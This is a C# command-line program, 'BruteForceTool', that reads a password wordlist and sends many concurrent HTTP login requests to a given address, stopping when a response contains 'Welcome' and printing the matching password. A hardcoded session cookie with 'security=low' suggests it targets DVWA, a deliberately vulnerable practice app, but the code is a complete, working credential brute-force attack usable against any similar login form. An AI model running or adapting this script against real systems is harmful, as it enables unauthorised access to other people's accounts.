using System.Linq;
using System.CommandLine;
using System.CommandLine.Parsing;

var addressOption = new Option<string>("-a")
{
    Description = "Address to brute force"
};

var fileOption = new Option<FileInfo>("-f")
{
    Description = "The file to read and display on the console."
};

addressOption.Required = true;
fileOption.Required = true;

var rootCommand = new RootCommand("BruteForceTool");
rootCommand.Options.Add(addressOption);
rootCommand.Options.Add(fileOption);

ParseResult parseResult = rootCommand.Parse(args);
if (parseResult.Errors.Count == 0 && parseResult.GetValue(fileOption) is FileInfo parsedFile)
{
    using var http = new HttpClient();
    http.DefaultRequestHeaders.Add("Cookie", "PHPSESSID=d49e698cba50cd9fbb379e4a96158e96; security=low");
    
    using var cts = new CancellationTokenSource();
    var throttler = new SemaphoreSlim(20);

    var processedNumber = 0;
    
    var target = parseResult.GetValue(addressOption);
    var lines = File.ReadAllLines(parsedFile.FullName);

    Console.WriteLine($"Loaded {lines.Length} candidates...");
    
    string? foundPassword = null;

    var tasks = lines.Select(async line =>
    {
        await throttler.WaitAsync();
        
        try
        {
            var url = $"{target}{line}&Login=Login";

            var response = await http.GetAsync(url, cts.Token);
            if (response.Content.ReadAsStringAsync().Result.Contains("Welcome", StringComparison.OrdinalIgnoreCase))
            {
                foundPassword = line;

                Console.WriteLine($"Match found: {line}");

                cts.Cancel();
            }
        }
        catch (OperationCanceledException)
        {
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error for '{line}': {ex.Message}");
        }
        finally
        {
            throttler.Release();
            Interlocked.Increment(ref processedNumber);
        }
    }).ToList();

    try
    {
        await Task.WhenAll(tasks);
    }
    catch (OperationCanceledException)
    {
    }

    if (foundPassword == null)
    {
        Console.WriteLine("No match was found!");
    }
    
    return 0;
}

foreach (ParseError parseError in parseResult.Errors)
{
    Console.Error.WriteLine(parseError.Message);
}

return 0;